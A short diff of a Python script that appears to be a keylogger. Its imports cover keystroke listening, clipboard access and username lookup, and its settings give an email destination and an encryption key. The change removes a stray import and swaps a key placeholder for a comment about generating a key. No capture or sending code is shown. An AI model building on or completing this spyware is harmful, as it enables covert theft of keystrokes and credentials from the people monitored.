@@ -11,7 +11,6 @@ import socket
 import platform
 
 import win32clipboard
-from Demos.win32cred_demo import username
 
 from pynput.keyboard import Key, Listener
 
@@ -52,7 +51,7 @@ username = getpass.getuser()
 
 toaddr = "gmail_id"
 
-key = "key"
+key = " " ## Generate an encryption key from the Cryptography folder
 
 file_path = "path_of_this_folder"
 extend = "\\"
